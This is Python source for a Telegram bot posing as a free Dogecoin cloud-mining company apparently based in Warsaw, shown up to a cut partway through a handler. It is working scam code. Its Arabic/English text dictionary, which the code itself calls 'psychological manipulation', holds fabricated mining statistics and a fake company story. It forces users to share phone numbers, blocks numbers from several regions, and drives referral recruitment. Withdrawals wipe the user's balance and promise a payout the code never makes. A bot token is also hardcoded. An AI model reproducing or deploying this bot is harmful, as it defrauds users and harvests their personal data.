from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import sqlite3
import time
import random
import re
import traceback

# ================= الإعدادات الأساسية =================
TOKEN = "8960593021:AAFkF-8Cvt_jsOHJmNUyBGWMvzmE0hIbMbk"
OWNER_ID = 6610111288
BOT_USERNAME = "Dogcoinibot"
DB_PATH = "/tmp/doge_bot_v5.db"
MIN_WITHDRAW = 0.01

# ================= قاموس اللغات والتلاعب النفسي =================
LANG = {
    'ar': {
        'btn_refresh': "🔄 تحديث الأرباح",
        'btn_withdraw': "💸 سحب الرصيد",
        'btn_team': "👥 فريقك (+30%)",
        'btn_tasks': "🔗 المهام المربحة",
        'btn_about': "🏢 عن الشركة",
        'btn_stats': "📊 إحصائيات المنجم",
        'btn_calc': "🧮 حاسبة الأرباح",
        'btn_support': "📞 الدعم الفني",
        'btn_lang': "🌐 English",
        'btn_admin': "👑 الإدارة (للمشرفين)",
        'phone_btn': "📱 مشاركة جهة الاتصال (إجباري)",
        'captcha_msg': "🤖 <b>نظام الحماية (Anti-Bot):</b>\n\nاضغط على الرمز المختلف (🔴) للبدء في جمع Dogecoin.",
        'phone_req': "🔒 <b>خطوة أمنية أخيرة:</b>\n\nلضمان عدم استخدام حسابات وهمية، يرجى مشاركة رقم هاتفك للتوثيق.",
        'phone_err': "❌ عذراً، الأرقام من هذه المنطقة الجغرافية غير مدعومة حالياً.",
        'sub_req': "⚠️ <b>تنبيه أمني!</b>\n\nيجب عليك الاشتراك في قنوات الشركة الرسمية لتفعيل حسابك.",
        'main_menu': "⛏ <b>خوادم التعدين النشطة</b>\n\n💰 الرصيد المباشر: <code>{balance:.8f}</code> <b>DOGE</b>\n⚡ قوة التعدين: <code>{speed:.8f}</code> DOGE/يوم\n👥 أعضاء الفريق: <code>{refs}</code>\n\n<i>🟢 حالة الخادم: متصل ومستقر.</i>",
        'team_msg': "👥 <b>برنامج الشركاء (Referral):</b>\n\nكل عضو تقوم بدعوته يزيد من سرعة تعدينك بنسبة <b>30%</b> فور إكماله التحقق.\n\n🔗 رابط الدعوة الخاص بك:\n<code>{link}</code>",
        'withdraw_err': "❌ رصيدك الحالي أقل من الحد الأدنى للسحب ({min} DOGE).",
        'withdraw_req': "💸 <b>بوابة السحب الآمنة:</b>\nأرسل الآن عنوان محفظة <b>Dogecoin (FaucetPay)</b> الخاصة بك لجدولة الدفعة:",
        'withdraw_done': "✅ <b>تم استلام طلب السحب!</b>\nتم تحويل الطلب لقسم المراجعة المالية، ستصلك الدفعة قريباً.",
        'task_msg': "🔗 <b>المهام الإعلانية:</b>\nاضغط على المهمة، تخطى الإعلانات، ثم انسخ الرمز السري وأرسله هنا:",
        'task_ok': "🎉 <b>عملية ناجحة!</b> تمت إضافة {reward:.8f} DOGE لحسابك.",
        'task_err': "❌ <b>رمز التحقق غير صحيح!</b> يرجى التأكد والمحاولة مجدداً.",
        'about_text': "🏢 <b>عن شركة DogeCore Solutions:</b>\n\nنحن شركة رائدة في مجال التعدين السحابي، يقع مقرنا الرئيسي في مدينة <b>وارسو، بولندا</b>. نعتمد في عملياتنا على مناخ أوروبا الشرقية البارد لتبريد مزارع خوادم الـ (ASIC) الخاصة بنا، مما يقلل تكاليف التشغيل ويسمح لنا بتقديم عوائد يومية مجانية ومستقرة لمستخدمينا حول العالم.\n\n<i>رؤيتنا: ديمقراطية العملات الرقمية للجميع.</i>",
        'stats_text': "📊 <b>إحصائيات الشبكة المباشرة:</b>\n\n👤 إجمالي عمال التعدين: <code>1,452,890+</code>\n⚡ قوة الهاش الإجمالية: <code>45.2 TH/s</code>\n💸 إجمالي السحوبات (اليوم): <code>12,450 DOGE</code>\n🟢 وقت التشغيل (Uptime): <code>99.98%</code>",
        'calc_text': "🧮 <b>حاسبة الأرباح المتوقعة:</b>\n\nإذا قمت بدعوة 10 أشخاص = زيادة 300% في سرعة التعدين!\nإذا قمت بدعوة 50 شخص = أرباح يومية قادرة على تحقيق دخل سلبي مستمر.\n\n<i>نصيحة: شارك رابطك في جروبات الفيسبوك والتيليجرام لمضاعفة أرباحك أضعافاً مضاعفة.</i>",
        'support_text': "📞 <b>مركز خدمة العملاء:</b>\n\nنظراً للضغط الهائل من المستخدمين الجدد، قد يستغرق الرد من فريق الدعم من 24 إلى 48 ساعة.\nيرجى التأكد من قراءة قسم (عن الشركة) قبل التواصل.",
        'admin_panel': "👑 <b>مركز القيادة (المالك والمشرفين):</b>\nاختر العملية المطلوبة لضبط إعدادات النظام:",
    },
    'en': {
        'btn_refresh': "🔄 Refresh Data",
        'btn_withdraw': "💸 Withdraw Funds",
        'btn_team': "👥 Your Team",
        'btn_tasks': "🔗 Tasks & Rewards",
        'btn_about': "🏢 About Us",
        'btn_stats': "📊 Network Stats",
        'btn_calc': "🧮 Profit Calculator",
        'btn_support': "📞 Support",
        'btn_lang': "🌐 العربية",
        'btn_admin': "👑 Admin Panel",
        'phone_btn': "📱 Share Contact (Required)",
        'captcha_msg': "🤖 <b>Anti-Bot System:</b>\n\nClick the unique symbol (🔴) to authenticate.",
        'phone_req': "🔒 <b>Security Check:</b>\n\nPlease share your phone number to verify your identity.",
        'phone_err': "❌ Registration from your region is currently disabled.",
        'sub_req': "⚠️ <b>Action Required!</b>\n\nYou must join our official channels to activate your miner.",
        'main_menu': "⛏ <b>Active Mining Servers</b>\n\n💰 Live Balance: <code>{balance:.8f}</code> <b>DOGE</b>\n⚡ Hash Power: <code>{speed:.8f}</code> DOGE/Day\n👥 Team Size: <code>{refs}</code>\n\n<i>🟢 Server Status: Online & Stable.</i>",
        'team_msg': "👥 <b>Partner Program:</b>\n\nEarn a <b>30%</b> mining speed boost for every active referral.\n\n🔗 Your Referral Link:\n<code>{link}</code>",
        'withdraw_err': "❌ Balance is below the minimum threshold ({min} DOGE).",
        'withdraw_req': "💸 <b>Secure Withdrawal:</b>\nSend your <b>Dogecoin (FaucetPay)</b> wallet address to schedule a payout:",
        'withdraw_done': "✅ <b>Request Logged!</b>\nYour payout is under review by our financial team.",
        'task_msg': "🔗 <b>Advertising Tasks:</b>\nComplete the link to find the hidden code, then send it here:",
        'task_ok': "🎉 <b>Success!</b> {reward:.8f} DOGE added.",
        'task_err': "❌ <b>Invalid Code!</b> Please try again.",
        'about_text': "🏢 <b>About DogeCore Solutions:</b>\n\nBased in <b>Warsaw, Poland</b>, we are pioneers in cloud mining. We leverage Eastern Europe's cold climate to naturally cool our ASIC server farms, drastically reducing operational costs. This efficiency allows us to provide stable, free daily yields to our global user base.",
        'stats_text': "📊 <b>Live Network Stats:</b>\n\n👤 Total Miners: <code>1,452,890+</code>\n⚡ Total Hashrate: <code>45.2 TH/s</code>\n💸 Paid Today: <code>12,450 DOGE</code>\n🟢 Uptime: <code>99.98%</code>",
        'calc_text': "🧮 <b>Profit Calculator:</b>\n\nInvite 10 friends = 300% Speed Boost!\nInvite 50 friends = Sustainable passive daily income.\n\n<i>Tip: Share your link on social media to multiply your earnings rapidly.</i>",
        'support_text': "📞 <b>Customer Support:</b>\n\nDue to exceptionally high traffic, our support team may take 24-48 hours to respond. Thank you for your patience.",
        'admin_panel': "👑 <b>Command Center:</b>\nSelect an administrative action below:",
    }
}

# ================= قاعدة البيانات =================
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY, phone TEXT, balance REAL DEFAULT 0.0,
                    speed REAL DEFAULT 0.0000000115, last_update INTEGER,
                    captcha_time INTEGER DEFAULT 0, referrer_id INTEGER DEFAULT 0,
                    ref_count INTEGER DEFAULT 0, state TEXT DEFAULT 'idle', lang TEXT DEFAULT 'ar')''')
    c.execute('''CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)''')
    c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (OWNER_ID,))
    c.execute('''CREATE TABLE IF NOT EXISTS channels (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT, ch_id TEXT, type TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS shortlinks (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT, password TEXT, reward REAL)''')
    conn.commit()
    conn.close()

init_db()

# ================= دوال التيليجرام =================
def call_api(method, payload):
    api_url = f"https://api.telegram.org/bot{TOKEN}/{method}"
    req = urllib.request.Request(api_url, data=json.dumps(payload).encode('utf-8'), headers={'Content-Type': 'application/json'})
    try: return json.loads(urllib.request.urlopen(req).read().decode('utf-8'))
    except: return None

def send_msg(chat_id, text, markup=None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
    if markup: payload["reply_markup"] = markup
    call_api("sendMessage", payload)

def check_sub(user_id, channel_id):
    res = call_api("getChatMember", {"chat_id": channel_id, "user_id": user_id})
    if res and res.get('ok'):
        return res['result']['status'] in ['member', 'administrator', 'creator']
    return False

# ================= المحرك الأساسي =================
class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            if not body:
                self.send_response(200)
                self.end_headers()
                return
                
            data = json.loads(body.decode('utf-8'))
            
            if 'message' in data: 
                try: self.handle_message(data['message'])
                except Exception: send_msg(OWNER_ID, f"⚠️ <b>Crash MSG:</b>\n<code>{traceback.format_exc()[-800:]}</code>")
            elif 'callback_query' in data: 
                try: self.handle_callback(data['callback_query'])
                except Exception: send_msg(OWNER_ID, f"⚠️ <b>Crash BTN:</b>\n<code>{traceback.format_exc()[-800:]}</code>")
                
        except Exception: pass
            
        self.send_response(200)
        self.end_headers()
        return

    def get_text(self, lang, key, **kwargs):
        text = LANG.get(lang, LANG['ar']).get(key, "")
        if kwargs: text = text.format(**kwargs)
        return text

    # بناء الكيبورد السفلي (معمارية الأزرار الجديدة)
    def get_reply_keyboard(self, lang, is_admin):
        kb = [
            [{"text": self.get_text(lang, 'btn_refresh')}],
            [{"text": self.get_text(lang, 'btn_withdraw')}, {"text": self.get_text(lang, 'btn_team')}],
            [{"text": self.get_text(lang, 'btn_tasks')}, {"text": self.get_text(lang, 'btn_calc')}],
            [{"text": self.get_text(lang, 'btn_stats')}, {"text": self.get_text(lang, 'btn_about')}],
            [{"text": self.get_text(lang, 'btn_support')}, {"text": self.get_text(lang, 'btn_lang')}]
        ]
        # إضافة زر الإدارة فقط للمشرفين
        if is_admin:
            kb.insert(0, [{"text": self.get_text(lang, 'btn_admin')}])
            
        return {"keyboard": kb, "resize_keyboard": True}

    def handle_message(self, msg):
        chat_id = msg['chat']['id']
        user_id = msg['from']['id']
        text = msg.get('text', '')
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        
        is_admin = c.execute("SELECT user_id FROM admins WHERE user_id = ?", (user_id,)).fetchone() is not None

        c.execute("SELECT phone, captcha_time, state, balance, lang, referrer_id FROM users WHERE user_id = ?", (user_id,))
        user = c.fetchone()
        now = int(time.time())
        
        if not user:
            ref_id = 0
            if text.startswith("/start ") and text.split(" ")[1].isdigit():
                ref_id = int(text.split(" ")[1])
            c.execute("INSERT INTO users (user_id, last_update, referrer_id) VALUES (?, ?, ?)", (user_id, now, ref_id))
            conn.commit()
            user = (None, 0, 'idle', 0.0, 'ar', ref_id)

        phone, captcha_time, state, balance, lang, ref_id = user
        bal_float = float(balance or 0)

        # 1. التحقق من الرقم 
        if not phone:
            if 'contact' in msg:
                p = msg['contact'].get('phone_number', '')
                if not p.startswith('+'): p = '+' + p
                if re.match(r'^\+(1|3|4|61)', p) and not p.startswith('+7'):
                    send_msg(chat_id, self.get_text(lang, 'phone_err'), {"remove_keyboard": True})
                    return
                c.execute("UPDATE users SET phone = ? WHERE user_id = ?", (p, user_id))
                conn.commit()
                send_msg(chat_id, "✅", {"remove_keyboard": True})
                self.send_captcha(chat_id, lang)
            else:
                markup = {"keyboard": [[{"text": self.get_text(lang, 'phone_btn'), "request_contact": True}]], "resize_keyboard": True}
                send_msg(chat_id, self.get_text(lang, 'phone_req'), markup)
            return

        # 2. الكابتشا
        if now - captcha_time > 3600:
            self.send_captcha(chat_id, lang)
            return

        # 3. التحقق من القنوات الإجبارية
        c.execute("SELECT url, ch_id FROM channels WHERE type = 'main'")
        for ch_url, ch_id in c.fetchall():
            if not check_sub(user_id, ch_id):
                markup = {"inline_keyboard": [[{"text": "📢 Join / اشترك", "url": ch_url}], [{"text": "✅ Check / تحقق", "callback_data": "check_main_sub"}]]}
                send_msg(chat_id, self.get_text(lang, 'sub_req'), markup)
                return

        # ================= معالجة أزرار الكيبورد السفلي =================
        if text == self.get_text(lang, 'btn_refresh'):
            self.send_main_menu(chat_id, user_id, c, conn, lang, is_admin)
            return
            
        elif text == self.get_text(lang, 'btn_lang'):
            new_lang = 'en' if lang == 'ar' else 'ar'
            c.execute("UPDATE users SET lang = ? WHERE user_id = ?", (new_lang, user_id))
            conn.commit()
            send_msg(chat_id, "🌐 Language Updated / تم تحديث اللغة", self.get_reply_keyboard(new_lang, is_admin))
            self.send_main_menu(chat_id, user_id, c, conn, new_lang, is_admin)
            return
            
        elif text == self.get_text(lang, 'btn_withdraw'):
            self.update_mining(user_id, c, conn)
            c.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
            current_bal = float(c.fetchone()[0] or 0)
            if current_bal < MIN_WITHDRAW:
                send_msg(chat_id, self.get_text(lang, 'withdraw_err', min=MIN_WITHDRAW))
            else:
                c.execute("UPDATE users SET state = 'wait_wallet' WHERE user_id = ?", (user_id,))
                conn.commit()
                send_msg(chat_id, self.get_text(lang, 'withdraw_req'))
            return
            
        elif text == self.get_text(lang, 'btn_team'):
            c.execute("SELECT ref_count FROM users WHERE user_id = ?", (user_id,))
            refs = int(c.fetchone()[0] or 0)
            link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
            send_msg(chat_id, self.get_text(lang, 'team_msg', refs=refs, link=link))
            return
            
        elif text == self.get_text(lang, 'btn_tasks'):
            c.execute("SELECT id, reward FROM shortlinks")
            links = c.fetchall()
            if not links:
                send_msg(chat_id, "No tasks / لا توجد مهام حالياً")
                return
            btns = [[{"text": f"🔗 Task (+{float(l[1] or 0):.8f})", "callback_data": f"do_link_{l[0]}"}] for l in links]
            send_msg(chat_id, self.get_text(lang, 'task_msg'), {"inline_keyboard": btns})
            return

        elif text == self.get_text(lang, 'btn_about'):
            send_msg(chat_id, self.get_text(lang, 'about_text'))
            return

        elif text == self.get_text(lang, 'btn_stats'):
            send_msg(chat_id, self.get_text(lang, 'stats_text'))
            return

        elif text == self.get_text(lang, 'btn_calc'):
            send_msg(chat_id, self.get_text(lang, 'calc_text'))
            return

        elif text == self.get_text(lang, 'btn_support'):
            send_msg(chat_id, self.get_text(lang, 'support_text'))
            return
            
        # فتح لوحة التحكم الشفافة من الكيبورد السفلي للمشرفين فقط
        elif text == self.get_text(lang, 'btn_admin') and is_admin:
            self.send_admin_panel(chat_id, lang)
            return

        # ================= معالجة الحالات (السحب والمهام والإدارة) =================
        system_btns = [self.get_text(lang, k) for k in ['btn_refresh', 'btn_withdraw', 'btn_team', 'btn_tasks', 'btn_lang', 'btn_about', 'btn_stats', 'btn_calc', 'btn_support', 'btn_admin']]
        
        if state == 'wait_wallet':
            if text in system_btns:
                c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
                conn.commit()
                return
                
            for admin in c.execute("SELECT user_id FROM admins").fetchall():
                send_msg(admin[0], f"🔔 <b>طلب سحب!</b>\n👤 آيدي: <code>{user_id}</code>\n💰 الرصيد: <code>{bal_float:.8f}</code>\n🏦 المحفظة:\n<code>{text}</code>")
            
            c.execute("UPDATE users SET balance = 0, state = 'idle' WHERE user_id = ?", (user_id,))
            conn.commit()
            send_msg(chat_id, self.get_text(lang, 'withdraw_done'))
            return

        elif state.startswith('wait_pass_'):
            if text in system_btns:
                c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
                conn.commit()
                return

            link_id = int(state.split('_')[2])
            c.execute("SELECT password, reward FROM shortlinks WHERE id = ?", (link_id,))
            link = c.fetchone()
            if link and text.strip() == link[0]:
                c.execute("UPDATE users SET balance = balance + ?, state = 'idle' WHERE user_id = ?", (float(link[1] or 0), user_id))
                conn.commit()
                send_msg(chat_id, self.get_text(lang, 'task_ok', reward=float(link[1] or 0)))
            else:
                c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
                conn.commit()
                send_msg(chat_id, self.get_text(lang, 'task_err'))
            return

        # إدارة الرصيد اليدوي
        elif state == 'admin_wait_bal_id' and is_admin:
            if text in system_btns:
                c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
                conn.commit()
                return
            try:
                target_id = int(text)
                c.execute("UPDATE users SET state = ? WHERE user_id = ?", (f'admin_wait_bal_amt_{target_id}', user_id))
                conn.commit()
                send_msg(chat_id, f"✅ تم تحديد المستخدم: {target_id}\nأرسل الآن المبلغ المراد إضافته:")
            except: send_msg(chat_id, "❌ الآيدي غير صحيح.")
            return
            
        elif state.startswith('admin_wait_bal_amt_') and is_admin:
            if text in system_btns:
                c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
                conn.commit()
                return
            target_id = int(state.split('_')[4])
            try:
                amount = float(text)
                c.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, target_id))
                c.execute("UPDATE users SET state = 'idle' WHERE user_id = ?", (user_id,))
                conn.commit()
                send_msg(chat_id, f"✅ تمت الإضافة.")
                send_msg(target_id, f"🎉 <b>إهداء من الإدارة!</b>\nتمت إضافة <code>{amount:.8f}</code> DOGE إلى رصيدك.")
            except: send_msg(chat_id, "❌ المبلغ غير صحيح.")
            return

        if text == "/start":
            send_msg(chat_id, "✅", self.get_reply_keyboard(lang, is_admin)) 
            self.send_main_menu(chat_id, user_id, c, conn, lang, is_admin)
        elif text == "/admin" and is_admin:
            self.send_admin_panel(chat_id, lang)

        conn.close()

    def handle_callback(self, cq):
        chat_id = cq['message']['chat']['id']
        user_id = cq['from']['id']
        data = cq['data']
        msg_id = cq['message']['message_id']
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute("SELECT lang, referrer_id, captcha_time FROM users WHERE user_id = ?", (user_id,))
        row = c.fetchone()
        
        if not row:
            send_msg(chat_id, "⚠️ يرجى إرسال /start من جديد.")
            c
